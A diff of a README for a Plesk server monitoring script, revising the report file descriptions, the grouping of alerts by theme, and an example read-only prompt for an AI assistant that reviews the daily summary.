 | `metrics` | figures for graphs over time: `load1`, `load5`, `load15`, `cpu_cores`, `mem_total_mb`, `mem_avail_mb`, `mem_avail_pct`, `disk_max_pct`, `inodes_max_pct`, `mail_delivered`, `mail_deferred`, `mail_bounced`, `mail_queue`, `mail_blocklist_rejections`, `mail_forwarded_rejections`, `mail_failed_logins_smtp`, `mail_failed_logins_imap`, `web_requests`, `web_5xx`, `web_login_posts`. A figure is missing (not 0) when its check did not run. |
-| `sections` | the text of each check, line by line, exactly as in the text report. `title` is its `== … ==` heading, for a daily check its first line when that ends with a colon (e.g. `TLS certificates`); the title line is not repeated in `lines`. No title for checks that add to another section, like `webmail`. |
+| `sections` | the text of each check, line by line, exactly as in the text report, in the order of the report (by theme). `title` is its `== … ==` heading – a check with several headings (`mail`) gives one section per heading, all with the same `check` –, for a daily check its first line when that ends with a colon (e.g. `TLS certificates`); the title line is not repeated in `lines`. The theme headings (`######## MAIL ########`) and the headings of the daily blocks are not in it; the check tells the theme (see [Example report](#example-report-fictional-data)). |
 | `pseudonymised` | `true` in the uploaded copy when `MASK_MAILBOXES=1` |
 
 The text is cleaned like the text report (no control characters); bytes that are not UTF-8 are dropped.
@@ -997,14 +1085,14 @@ Every run uploads three kinds of files:
 | File | Content |
 |---|---|
 | `report-YYYYMMDD-HHMM.txt` | the full report of one run (time in the server's time zone, usually UTC) |
-| `latest.txt` | a copy of the newest report, including the daily checks and fail2ban |
+| `latest.txt` | a copy of the newest report |
 | `report-YYYYMMDD-HHMM.json`, `latest.json`, `summary.json` | only with `JSON_REPORT=1`: the same run and the same summary as JSON, see [JSON report](#json-report-optional-json_report1) |
-| `summary.txt` | all reports of the last 24 hours condensed into one file: every run with its status (gaps are easy to spot), every alert with how often and when it was seen, mail and web totals, deliveries per provider, peaks of load and RAM, the backup status of the newest report, and every line of the sections that are normally empty (successful logins, changes of SSH keys, accounts, cron jobs and ports, suspicious processes, IMAP/POP3 logins from other countries, new PHP files in uploads, login ≠ from, webmail, WordPress attacks, traffic peaks, files served with 200) |
+| `summary.txt` | all reports of the last 24 hours condensed into one file, in the same themes as the reports: every run with its status (gaps are easy to spot), every alert with how often and when it was seen (grouped by theme, the critical ones first), mail and web totals, deliveries per provider, failed panel logins, fail2ban per jail, failed certificate renewals, peaks of load and RAM, the backup status of the newest report, every line of the sections that are normally empty (successful logins, changes of SSH keys, accounts, cron jobs and ports, suspicious processes, IMAP/POP3 logins from other countries, new PHP files in uploads, login ≠ from, webmail, WordPress attacks, traffic peaks, files served with 200) – and the newest results of the daily checks of each theme |
 
-- **Yourself:** open `latest.txt`. The first lines tell you everything: `STATUS: OK` or `STATUS: WARNING (n)` followed by the list of alerts (` ! `) and, if any, notes about missing data (` i `, e.g. a log file that was not found – the figures of that section are then 0, not "all clear"). `summary.txt` shows what happened during the day.
-- **With an AI assistant (this is how the author uses it, with Claude):** connect an assistant that supports your storage (e.g. a Google Drive or OneDrive connector) **to the dedicated account** and let it review the day every morning as a scheduled task. Reading `summary.txt` and `latest.txt` instead of every single report keeps the review fast and cheap (two files instead of 24), without losing anything: the summary is built from the reports and keeps every alert. Tell the assistant what is normal on your server (known broken sites, mail-only domains, …) so it only reports real changes. Example prompt:
+- **Yourself:** open `latest.txt`. The first lines tell you everything: `STATUS: OK` or `STATUS: WARNING (n)` followed by the alerts (` ! `), grouped by theme (`MAIL (2):`, `ACCESS (1):` …), and, if any, notes about missing data (` i `, e.g. a log file that was not found – the figures of that section are then 0, not "all clear"). `summary.txt` shows what happened during the day.
+- **With an AI assistant (this is how the author uses it, with Claude):** connect an assistant that supports your storage (e.g. a Google Drive or OneDrive connector) **to the dedicated account** and let it review the day every morning as a scheduled task. Reading only `summary.txt` instead of every single report keeps the review fast and cheap (one file instead of 24), without losing anything: the summary is built from the reports, keeps every alert and has the newest daily checks. Tell the assistant what is normal on your server (known broken sites, mail-only domains, …) so it only reports real changes. Example prompt:
 
-  > In the folder `server-reports/<hostname>`, search for the files `summary.txt` and `latest.txt` by name – don't list the whole folder. Read both. `summary.txt` condenses all reports of the last 24 hours (runs with status, every alert with count and first/last time, totals, every successful login); `latest.txt` is the newest full report with the daily checks and fail2ban. If `summary.txt` is missing or its newest run is more than 2 hours old, report that as an issue. Check the run list for gaps (more than 2 hours between runs). (Both limits assume the hourly cron job – if it runs every N hours, use N + 1 hours.) Alerts starting with "Script:" and the section SCRIPT NOTES mean the report itself is incomplete (a run aborted or still hanging, a command timed out, a log file not found) – report them too. Only if an alert needs more detail, read the single report of that time (`report-YYYYMMDD-HHMM.txt`). Summarise: outgoing spam signals, blocklist listings and rejections by the big mail providers ("Rejections of forwarded mail" were not sent by a customer, but forwarded spam still counts against the server IP – the alert "forwarded mails rejected" is an issue: name the forwarding address, the target and the original sender; below it, mention them only when they pile up), deliveries to watched recipient domains, addresses that forward spam to other providers (daily check of mail forwarding), mailbox logins from new countries (a login that read no mail is less likely an attack than one that downloaded the mailbox), customers banned by fail2ban (alert starting with "fail2ban:" – include the unban command and the failed login named as the cause) and customer devices with an outdated password before the ban ("failed logins of … – a device with an outdated password?"), new PHP files in uploads, logins from unknown IPs (a Plesk panel login under another name than your admin user always), new SSH keys, accounts, cron jobs, processes or ports (alerts starting with "Access:", "Cron:", "Process:", "Ports:" – many accounts getting the same shell in one run come as one alert, likely your own change), Plesk system users with a full shell or a keys file they can change themselves ("SSH:"), databases reachable from the internet ("Database:"), domains on a PHP version without security support ("PHP:"; support ending within 90 days: mention once), failed services, crashes of nginx, Apache or the Plesk panel (alert starting with "Crash:" – can be an attack on a memory bug), loaded kernel modules of rarely used network protocols ("Kernel:"), 5xx/PHP errors, pending security updates, a newer script version (mention once), expiring certificates and failed automatic renewals, refused blocklist lookups of the spam filter, delivery confirmations sent to other servers, a new IP address of the server, full mailboxes, mail authentication, exposed files, backup status. Lines marked as a recommendation (e.g. missing HSTS) are not an issue – mention them once at the end. Start with "All OK" or "Action required: …", max. 10 bullet points with a concrete next step. Read only, change nothing.
+  > In the folder `server-reports/<hostname>`, search for the file `summary.txt` by name – don't list the whole folder. It condenses all reports of the last 24 hours in four themes – MAIL, ACCESS, WEB, SYSTEM: runs with status, every alert with count and first/last time (grouped by theme, the critical ones first), totals, every successful login, fail2ban, and at the end of each theme the newest daily checks. If `summary.txt` is missing or its newest run is more than 2 hours old, report that as an issue. Check the run list for gaps (more than 2 hours between runs). (Both limits assume the hourly cron job – if it runs every N hours, use N + 1 hours.) Alerts starting with "Script:" and the section SCRIPT NOTES mean the report itself is incomplete (a run aborted or still hanging, a command timed out, a log file not found) – report them too. If the daily checks of a theme are more than 26 hours old ("as of" in their heading), they did not run – report that too. Only if an alert needs more detail, read the single report of that time (`report-YYYYMMDD-HHMM.txt`). Go through the themes in their order. MAIL: outgoing spam signals, blocklist listings and rejections by the big mail providers ("Rejections of forwarded mail" were not sent by a customer, but forwarded spam still counts against the server IP – the alert "forwarded mails rejected" is an issue: name the forwarding address, the target and the original sender; below it, mention them only when they pile up), deliveries to watched recipient domains, addresses that forward spam to other providers (daily check of mail forwarding), mailbox logins from new countries (a login that read no mail is less likely an attack than one that downloaded the mailbox), customer devices with an outdated password ("failed logins of … – a device with an outdated password?"), refused blocklist lookups of the spam filter, delivery confirmations sent to other servers, full mailboxes, mail authentication. ACCESS: customers banned by fail2ban (alert starting with "fail2ban:" – include the unban command and the failed login named as the cause), logins from unknown IPs (a Plesk panel login under another name than your admin user always), new SSH keys, accounts, cron jobs, processes or ports (alerts starting with "Access:", "Cron:", "Process:", "Ports:" – many accounts getting the same shell in one run come as one alert, likely your own change), a new IP address of the server, Plesk system users with a full shell or a keys file they can change themselves ("SSH:"), databases reachable from the internet ("Database:"). WEB: new PHP files in uploads, 5xx/PHP errors, expiring certificates and failed automatic renewals, exposed files. SYSTEM: failed services, crashes of nginx, Apache or the Plesk panel (alert starting with "Crash:" – can be an attack on a memory bug), backup status, pending security updates, a newer script version (mention once), domains on a PHP version without security support ("PHP:"; support ending within 90 days: mention once), loaded kernel modules of rarely used network protocols ("Kernel:"). Lines marked as a recommendation (e.g. missing HSTS) are not an issue – mention them once at the end. Start with "All OK" or "Action required: …", max. 10 bullet points with a concrete next step, the most urgent first. Read only, change nothing.
 
 - A daily review **does not replace real-time alerting**. For "server down" use an uptime monitor (e.g. Plesk 360 Monitoring, Uptime Kuma), and set **outgoing mail limits** in Plesk (*Tools & Settings → Outgoing Mail Control*) so a hijacked mailbox is throttled immediately.
 
